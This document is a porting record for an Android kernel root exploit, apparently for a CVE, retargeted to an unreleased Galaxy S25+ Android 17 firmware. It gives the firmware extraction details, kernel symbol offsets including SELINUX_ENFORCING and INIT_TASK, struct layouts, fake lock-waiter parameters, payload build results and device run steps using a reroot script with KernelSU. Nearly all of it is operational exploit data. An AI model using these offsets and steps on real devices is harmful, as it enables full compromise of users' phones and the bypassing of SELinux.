# SM-S9360 / S9360ZHUDDZIF porting record (Android 17)

Port of profile `pa2q-S9360ZHUDDZIF`, built 2026-10-08 from the `TGY`/`OZS`
factory package for `S9360ZHUDDZIF` — the Android 17 (`meta_OS17`) release for
`SM-S9360`, taken from FUS **before its OTA rollout** (the FUS history lists it
with an empty date field; the Android 16 `S9360ZHSDCZH1` was still the newest
published build).

**Hardware validation is pending.** Every value below was re-derived from this
build's own kernel Image, BTF and symbol table; the exploit has not been run on
an Android 17 device yet.

## 1. Firmware identity

| field | value |
| --- | --- |
| model | `SM-S9360` (Galaxy S25+, Hong Kong `TGY` / `OZS`) |
| PDA / CSC / CP | `S9360ZHUDDZIF` / `S9360OZSDDZIF` / `S9360ZCUDDZIF` |
| full tuple | `S9360ZHUDDZIF/S9360OZSDDZIF/S9360ZCUDDZIF/S9360ZHUDDZIF` |
| OS | Android 17 (`meta_OS17`), One UI 9 |
| kernel release | `6.6.127-android15-8-p33f4ffe-abogkiS9360ZHUDDZIF-4k` |
| kernel build | `#1 SMP PREEMPT Sat Sep 19 14:44:23 UTC 2026` |
| kernel SHA-256 | `71e8fc62b4256b3ce6b07828cb5e8129f4e8b6edc678d52e12337de11e1226e1` (raw Image from `boot.img`) |
| boot.img SHA-256 | `19d501b600b5f042cf25ad5dfad73987594519a9e4c4ffe8eae1f6a52d31b627` |
| codename | `pa1q` family: S25+ = `pa2q` (unchanged from the Android 16 profile) |
| build fingerprint | `samsung/pa2qzhx/pa2q:17/<BUILD-ID>/S9360ZHUDDZIF_OZSDDZIF:user/release-keys` — **build id still to be read from the device** |

Extraction values:

```text
boot.img size: 101122048 (header v4, header_size 1584, page 4096 — identical to Android 16)
kernel size:   39115264 (0x254DA00), copied from boot offset 0x1000   (A16: 38849024)
ARM64 Image text_offset 0x0, image_size 0x27F0000, flags 0xa
raw BTF interval: [0x18ACA6C, 0x1ECD673)  6425607 bytes, 147790 types   (A16: 6386356 bytes)
vmlinux-to-elf base 0xffffffc080000000, 115126 kallsyms symbols        (A16: 114227)
kallsyms_offsets at file offset 0x0161b128                              (A16: 0x015eaa20)
```

### Source provenance

```text
FUS package      SM-S9360_3_20260920224740_cjhnjfb9zi_fac.zip.enc4
FUS package size 18859269824 bytes
MODEL_PATH       /neofus/910/
AP member        AP_S9360ZHUDDZIF_S9360ZHUDDZIF_MQB115081340_REV00_user_low_ship_MULTI_CERT_meta_OS17.tar.md5
AP compressed    18513997189 bytes
BL member        BL_S9360ZHUDDZIF_S9360ZHUDDZIF_MQB115081340_REV00_user_low_ship_MULTI_CERT.tar.md5
CP member        CP_S9360ZCUDDZIF_CP36491252_MQB115081032_REV00_user_low_ship_MULTI_CERT.tar.md5
CSC member       CSC_OZS_S9360OZSDDZIF_MQB115081340_REV00_user_low_ship_MULTI_CERT.tar.md5
HOME_CSC member  HOME_CSC_OZS_S9360OZSDDZIF_MQB115081340_REV00_user_low_ship_MULTI_CERT.tar.md5
boot.img.lz4     22800492 bytes, SHA-256 2b2cf2ddea62a8d81d0296f9c10faa9e646f0b3d00aff1944d8091df9e0c8d89
```

Only ~65 MB of the 18.9 GB package were transferred: the container is a
whole-file AES-128-ECB transform, so any 16-byte-aligned `Range` request
decrypts independently, and the AP member is inflated only until
`boot.img.lz4` is complete.

## 2. What changed from Android 16 (6.6.98 → 6.6.127)

Every one of the 22 profile offsets moved; nothing was copyable. The deltas are
listed in §3. Two structural checks came back clean, which is why this port is
a re-derivation rather than a redesign:

**BTF layouts are unchanged.** Extracted from the new Image and compared member
by member against the Android 16 values:

```text
file_operations 0x108  (unlocked_ioctl 0x48, compat_ioctl 0x50, mmap 0x58,
                        open 0x68, release 0x78, splice_read 0xb8, show_fdinfo 0xd8)
page 0x40 (compound_head 0x08, _refcount 0x34)   slab 0x40 (slab_cache 0x08)
rt_mutex_waiter 0x70 (tree 0x00, pi_tree 0x28, task 0x50, lock 0x58,
                      wake_state 0x60, ww_ctx 0x68)
configfs_buffer 0x80 (page 0x10, needs_read_fill 0x50, bin_buffer 0x58,
                      bin_buffer_size 0x60, cb_max_size 0x64)
work_struct 0x30   workqueue_struct.dfl_pwq 0xb0   miscdevice.fops 0x10
pipe_buffer 0x28   pipe_inode_info 0xb8
```

**The pselect path is unchanged.** `core_sys_select` disassembles to 230
instructions in both kernels with only two differing instructions (an
`adrp`/`add` pair loading a different rodata address), so the fd-set stack
layout that `SLIDE_PSELECT_WORD_SHIFT` encodes is untouched and the S25 family
keeps using the source default (`0`, `src/slide_app.c:16`) — the value was not
copied, it was checked.

`SLIDE_TRACEFS_EVENT_ID` was recomputed rather than assumed:
`20 + (0x022f17e8 - 0x022f1520)/8 = 109`, identical to Android 16, which is
also the source default in `src/slide.c:5`.

## 3. Offsets

All values re-derived from this build's `vmlinux.elf`/`vmlinux.nm`, raw BTF and
Image.

| macro | Android 17 | Android 16 | delta |
| --- | --- | --- | --- |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `0x000d1278` | `0x000d0eac` | +0x3cc |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `0x000d9ba0` | `0x000d97ec` | +0x3b4 |
| `NOOP_LLSEEK_OFF` | `0x003cb7f8` | `0x003c9450` | +0x23a8 |
| `COPY_SPLICE_READ_OFF` | `0x004190cc` | `0x00416970` | +0x275c |
| `CONFIGFS_READ_ITER_OFF` | `0x004983d4` | `0x004954b8` | +0x2f1c |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `0x00498900` | `0x004959e4` | +0x2f1c |
| `ASHMEM_IOCTL_OFF` | `0x00d7e6c0` | `0x00d70dfc` | +0xd8c4 |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x00d7ed7c` | `0x00d714b8` | +0xd8c4 |
| `ASHMEM_MMAP_OFF` | `0x00d7edd0` | `0x00d7150c` | +0xd8c4 |
| `ASHMEM_OPEN_OFF` | `0x00d7eff0` | `0x00d7172c` | +0xd8c4 |
| `ASHMEM_RELEASE_OFF` | `0x00d7f078` | `0x00d717b4` | +0xd8c4 |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x00d7f104` | `0x00d71840` | +0xd8c4 |
| `ANON_PIPE_BUF_OPS_OFF` | `0x01278148` | `0x0124cdc8` | +0x2b380 |
| `ASHMEM_FOPS_OFF` | `0x01437480` | `0x0140b440` | +0x2c040 |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` (string) | `0x01791638` | `0x0175e299` | +0x33b9f |
| `KMALLOC_CACHES_OFF` | `0x0180e578` | `0x017da710` | +0x33e68 |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x0233ac60` | `0x022fae60` | +0x3fe00 |
| `INIT_TASK_OFF` | `0x0234e2c0` | `0x0230e4c0` | +0x3fe00 |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `0x02342080` | `0x02302278` | +0x3fe08 |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `0x024785c0` | `0x02439490` | +0x3f130 |
| `ASHMEM_MISC_FOPS_OFF` | `0x024bcd80` | `0x0247d7f0` | +0x3f590 |
| `ROOT_TASK_GROUP_OFF` | `0x0255df80` | `0x0251cd80` | +0x41200 |
| `SELINUX_ENFORCING_OFF` | `0x025a0810` | `0x0255f5c0` | +0x41250 |
| `SLIDE_SYSCTL_BOOTID_OFF` | `0x02683910` | `0x026426d8` | +0x41238 |

Unchanged and re-confirmed:

```text
KIMAGE_TEXT_BASE 0xffffffc080000000   P0_PAGE_OFFSET 0xffffff8000000000
P0_PHYS_OFFSET 0x80000000             P0_KERNEL_PHYS_LOAD 0xa8000000
SKB_DATA_DELTA (-0xe80)               LOCK_OFF 0x2210  W0_OFF 0x2350
FOPS_OFF 0x2000  SCRATCH_OFF 0x3000   RIGHT_OFF 0x4440
SLIDE_TRACEFS_EVENT_ID 109            SLIDE_PSELECT_WORD_SHIFT 0 (source default)
SLIDE_FAKE_WAITER_PRIO 0  SLIDE_WAITER_WAKE_STATE 0  SLIDE_LOCK_OWNER_VALUE 1
SLIDE_BANK_* 0x1000 / 0x1c0 / 0x5200 / 0x100 / 0x40, SLIDE_BANK_SLOTS 4
P0_ORACLE_GATE_PAGE_OFF 0x0e80  P0_ORACLE_GATE_OBJECT_INDEX 1
```

Derivation of the two boot_id-related values (string → pointer → sysctl):

```text
"boot_id" string at Image 0x0174b0ed
  -> pointer to it found at 0x024785c0 (random_table boot_id entry data ptr)
  -> that slot holds 0xffffffc082683910 = KIMAGE_TEXT_BASE + 0x02683910
```

## 4. p0 fingerprint

Regenerated with `tools/generate_p0_fingerprint.pl kernel 0x1f0000 …`
(32 rows and 256 source qwords verified before writing). **All 27 changed rows
differ from the Android 16 table** — the kernel text moved enough that no row
could be reused. The `SLIDE_P0_OFFSET_CANDIDATES` order is unchanged; it is a
heuristic list and the fingerprint table is what actually validates a slide at
runtime.

## 5. Validation status

Passed offline:

* firmware fetched from FUS pre-release and the exact part names recorded;
* `boot.img.lz4` → `boot.img` → raw Image → `vmlinux-to-elf` (115126 symbols)
  and BTF extraction;
* all 24 firmware-dependent macros re-derived (not copied) and diffed against
  Android 16;
* BTF layout comparison, `core_sys_select` instruction comparison,
  `worker_thread` disassembly for the tracefs caller;
* p0 fingerprint generated and read back;
* `make TARGET=pa2q-S9360ZHUDDZIF all` with the official NDK r28c — the three
  payloads come out at exactly the same sizes as the Android 16 profiles, the
  root helper is byte-identical to the published one, and the new fingerprint
  table is embedded (256/256 qwords present in `cve-2026-43499-app.so`);
* `llvm-objdump` diff against the Android 16 `cve-2026-43499-app.so`: changes
  are confined to the re-derived immediates, the rodata addresses shifted by the
  changed `BUILD_VARIANT_LABEL` string, and the resulting branch displacement
  changes.

Pending on hardware:

1. Fill in the build id:
   `adb shell getprop ro.build.fingerprint` → replace `UNKNOWN-BUILD-ID` in
   `src/targets/pa2q-S9360ZHUDDZIF/target.h`. Nothing compiled embeds it.
2. Run `tools/reroot.sh --target pa2q-S9360ZHUDDZIF --attempts 32`, first with
   `--no-ksu` to validate the exploit alone.
3. Record the observed `p0_offset`, the cache-gate line and `u:r:ksu:s0` here
   and change the artifact README from "offline-verified" to "device-tested".

If the exploit fails, the first things to re-check are, in order: the p0
candidate order, `SLIDE_TRACEFS_WORKER_CALLER_OFF` (verify that every observed
kworker caller minus the unslid value is 64-KiB aligned), and
`SLIDE_PSELECT_WORD_SHIFT` (re-derive from this kernel's `core_sys_select`
frame layout — it was verified unchanged here, but it is the value that most
often needs a per-kernel answer).

## 6. Scope

Verified offline only for `SM-S9360` / `S9360ZHUDDZIF`. The same wave covers
`SM-S9310` (`S9310ZHUDDZIF`) and `SM-S9380` (`S9380ZHUDDZIF`) — those packages
are on FUS too, but their kernels are separate Images and need their own
derivation. Do not use this payload on any Android 16 build: every offset
differs.
